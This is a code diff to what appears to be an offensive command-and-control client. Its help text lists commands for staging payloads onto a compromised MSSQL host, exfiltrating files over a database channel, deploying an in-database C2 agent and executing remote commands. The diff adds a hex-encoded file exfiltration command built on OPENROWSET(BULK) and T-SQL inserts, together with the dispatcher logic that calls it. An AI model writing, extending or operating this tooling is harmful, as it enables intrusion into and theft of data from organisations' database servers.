@@ -21,6 +21,7 @@ Built-in commands (case-insensitive):
     xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel (base64+AES)
     xpstage-hex <payload>                  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
     xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
+    xpexfil-hex <remote_path> <local_name> [timeout] [chunk_mb]    hex exfil via OPENROWSET(BULK) + T-SQL INSERT; C2 Python decode
     xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
     xpagent kill                    drop xpagent database (cleanup)
     xpexec <cmd>                    run command via xpagent SB queue, wait for result
@@ -195,6 +196,20 @@ class ToneShellShell(C2Client):
                         t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
                         c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
                         self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)
+
+                elif cmd == "xpexfil-hex":
+                    xp_parts = line.split()
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(xp_parts) < 3:
+                        print("usage: xpexfil-hex <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
+                        c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
+                        self._xp.cmd_xpexfil_hex(self, xp_parts[1], xp_parts[2],
+                                                  insert_timeout_s=t, chunk_mb=c)
 
                 elif cmd == "xpagent":
                     sub = parts[1].lower() if len(parts) >= 2 else ""
